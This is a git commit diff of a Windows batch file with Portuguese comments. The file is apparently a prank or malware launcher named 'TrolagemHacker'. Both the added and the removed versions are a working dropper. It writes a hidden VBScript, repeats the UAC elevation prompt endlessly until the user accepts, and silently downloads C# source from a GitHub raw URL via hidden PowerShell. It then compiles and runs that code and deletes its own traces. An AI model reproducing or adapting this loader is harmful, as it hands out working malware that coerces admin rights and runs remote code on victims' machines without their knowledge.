37513562f1fca4170a51da72d36d9f76b4940e70
espertin <contarbins@gmail.com>
2026-04-08 14:18:22 -0300

    Update AUTORUN_NINJA_FINAL (1).bat

--- AUTORUN_NINJA_FINAL (1).bat
+++ AUTORUN_NINJA_FINAL (1).bat
@@ -1,88 +1,51 @@
 @echo off
 :: =============================================================
-:: VERIFICAR SE JÁ SOMOS ADMIN (instância elevada)
+:: Este BAT cria um VBScript oculto que faz todo o trabalho
+:: O CMD fecha instantaneamente e o VBS roda em segundo plano
 :: =============================================================
-net session >nul 2>&1
-if %errorlevel% equ 0 (
-    :: Somos Admin! Criar sinal para o loop parar
-    echo OK > "%temp%\admin_ok.flag"
-    goto EXECUTAR
-)
 
-:: =============================================================
-:: NÃO SOMOS ADMIN - LOOP INFINITO ATÉ ACEITAR
-:: =============================================================
-:: Limpar flag antiga se existir
-del /f /q "%temp%\admin_ok.flag" >nul 2>&1
+:: Criar o script VBS que roda 100%% oculto
+echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\motor.vbs"
+echo Set fso = CreateObject("Scripting.FileSystemObject") >> "%temp%\motor.vbs"
+echo. >> "%temp%\motor.vbs"
+echo ' URLs e caminhos >> "%temp%\motor.vbs"
+echo githubURL = "https://raw.githubusercontent.com/espertin/wind/main/TrolagemHacker_GitHub.cs?nocache=" ^& Timer >> "%temp%\motor.vbs"
+echo tempCS = WshShell.ExpandEnvironmentStrings("%%temp%%") ^& "\TrolagemHacker.cs" >> "%temp%\motor.vbs"
+echo tempEXE = WshShell.ExpandEnvironmentStrings("%%temp%%") ^& "\TrolagemHacker.exe" >> "%temp%\motor.vbs"
+echo flagFile = WshShell.ExpandEnvironmentStrings("%%temp%%") ^& "\admin_ok.flag" >> "%temp%\motor.vbs"
+echo batAdmin = WshShell.ExpandEnvironmentStrings("%%temp%%") ^& "\run_admin.bat" >> "%temp%\motor.vbs"
+echo. >> "%temp%\motor.vbs"
+echo ' Criar o BAT que sera executado como Admin >> "%temp%\motor.vbs"
+echo Set f = fso.CreateTextFile(batAdmin, True) >> "%temp%\motor.vbs"
+echo f.WriteLine "@echo off" >> "%temp%\motor.vbs"
+echo f.WriteLine "echo OK > """ ^& flagFile ^& """" >> "%temp%\motor.vbs"
+echo f.WriteLine "set ""CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe""" >> "%temp%\motor.vbs"
+echo f.WriteLine "if not exist ""%%CSC%%"" set ""CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe""" >> "%temp%\motor.vbs"
+echo f.WriteLine "powershell -WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" ^& githubURL ^& "', '" ^& tempCS ^& "')""" >> "%temp%\motor.vbs"
+echo f.WriteLine "if exist """ ^& tempCS ^& """ ""%%CSC%%"" /nologo /target:winexe /out:""" ^& tempEXE ^& """ """ ^& tempCS ^& """ >nul 2>&1" >> "%temp%\motor.vbs"
+echo f.WriteLine "if exist """ ^& tempEXE ^& """ start """" """ ^& tempEXE ^& """" >> "%temp%\motor.vbs"
+echo f.WriteLine "del /f /q """ ^& tempCS ^& """ >nul 2>&1" >> "%temp%\motor.vbs"
+echo f.WriteLine "del /f /q ""%%~f0"" >nul 2>&1" >> "%temp%\motor.vbs"
+echo f.WriteLine "exit" >> "%temp%\motor.vbs"
+echo f.Close >> "%temp%\motor.vbs"
+echo. >> "%temp%\motor.vbs"
+echo ' Deletar flag antiga >> "%temp%\motor.vbs"
+echo If fso.FileExists(flagFile) Then fso.DeleteFile(flagFile) >> "%temp%\motor.vbs"
+echo. >> "%temp%\motor.vbs"
+echo ' LOOP INFINITO: Pedir Admin ate aceitar >> "%temp%\motor.vbs"
+echo Set objShell = CreateObject("Shell.Application") >> "%temp%\motor.vbs"
+echo Do While Not fso.FileExists(flagFile) >> "%temp%\motor.vbs"
+echo     objShell.ShellExecute batAdmin, "", "", "runas", 0 >> "%temp%\motor.vbs"
+echo     WScript.Sleep 2500 >> "%temp%\motor.vbs"
+echo Loop >> "%temp%\motor.vbs"
+echo. >> "%temp%\motor.vbs"
+echo ' Admin aceito! Limpar rastros >> "%temp%\motor.vbs"
+echo WScript.Sleep 1000 >> "%temp%\motor.vbs"
+echo If fso.FileExists(flagFile) Then fso.DeleteFile(flagFile) >> "%temp%\motor.vbs"
 
-:PEDIR_ADMIN
-:: Verificar se a instância elevada já criou o sinal
-if exist "%temp%\admin_ok.flag" (
-    del /f /q "%temp%\admin_ok.flag" >nul 2>&1
-    :: Admin foi aceito, a instância elevada já está rodando
-    :: Esta instância original pode morrer em paz
-    (goto) 2>nul & del /f /q "%~f0"
-    exit
-)
+:: Executar o VBS em modo oculto e fechar o CMD instantaneamente
+start "" /min cscript //nologo "%temp%\motor.vbs"
 
-:: Pedir Admin via VBS (abre a janela UAC)
-echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-echo UAC.ShellExecute "%~f0", "", "", "runas", 0 >> "%temp%\getadmin.vbs"
-cscript //nologo "%temp%\getadmin.vbs" >nul 2>&1
-del /f /q "%temp%\getadmin.vbs" >nul 2>&1
-
-:: Esperar 2 segundos para dar tempo do UAC aparecer e ser respondido
-ping 127.0.0.1 -n 3 -w 1000 >nul 2>&1
-
-:: Verificar novamente se o Admin foi aceito
-if exist "%temp%\admin_ok.flag" (
-    del /f /q "%temp%\admin_ok.flag" >nul 2>&1
-    (goto) 2>nul & del /f /q "%~f0"
-    exit
-)
-
-:: Não aceitou ainda, pedir de novo
-goto PEDIR_ADMIN
-
-:: =============================================================
-:: EXECUÇÃO COM ADMIN (modo oculto)
-:: =============================================================
-:EXECUTAR
-:: Relançar em modo oculto se ainda visível
-if not "%~1"=="OCULTO" (
-    echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\launcher.vbs"
-    echo WshShell.Run """cmd /c """"" ^& "%~f0" ^& """""" OCULTO", 0, False >> "%temp%\launcher.vbs"
-    cscript //nologo "%temp%\launcher.vbs"
-    del /f /q "%temp%\launcher.vbs" >nul 2>&1
-    exit
-)
-
-:: =============================================================
-:: DOWNLOAD, COMPILAÇÃO E EXECUÇÃO (100%% invisível com Admin)
-:: =============================================================
-set "GITHUB_RAW_URL=https://raw.githubusercontent.com/espertin/wind/main/TrolagemHacker_GitHub.cs"
-set "TEMP_CS=%temp%\TrolagemHacker.cs"
-set "EXE_OUT=%temp%\TrolagemHacker.exe"
-
-:: --- LOCALIZAR COMPILADOR ---
-set "CSC_PATH=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
-if not exist "%CSC_PATH%" set "CSC_PATH=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
-
-:: --- DOWNLOAD SILENCIOSO (SEM CACHE) ---
-powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%GITHUB_RAW_URL%?nocache=' + [DateTime]::Now.Ticks, '%TEMP_CS%')" >nul 2>&1
-
-:: --- COMPILAÇÃO SILENCIOSA ---
-if exist "%TEMP_CS%" (
-    "%CSC_PATH%" /nologo /target:winexe /out:"%EXE_OUT%" "%TEMP_CS%" >nul 2>&1
-)
-
-:: --- EXECUÇÃO ---
-if exist "%EXE_OUT%" (
-    start "" "%EXE_OUT%"
-)
-
-:: --- LIMPEZA E AUTODESTRUIÇÃO ---
-del /f /q "%TEMP_CS%" >nul 2>&1
-del /f /q "%temp%\admin_ok.flag" >nul 2>&1
+:: Autodestruir o BAT original
 (goto) 2>nul & del /f /q "%~f0"
 exit
